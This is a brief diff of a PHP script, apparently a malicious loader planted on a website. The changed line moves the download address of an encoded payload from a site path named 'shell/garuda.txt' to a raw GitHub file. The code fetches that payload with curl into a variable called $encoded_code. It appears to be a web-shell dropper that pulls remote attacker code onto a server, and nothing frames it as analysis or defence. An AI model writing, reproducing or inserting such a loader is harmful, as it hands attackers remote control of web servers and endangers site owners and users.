@@ -20,7 +20,7 @@ curl_close($ch);
 return $result;
 }
 
-$url = 'https://miawseo.site/shell/garuda.txt';
+$url = 'https://raw.githubusercontent.com/fastseo15/original/refs/heads/main/garuda.txt';
 $encoded_code = get_contents($url);
 
 if ($encoded_code === false) {
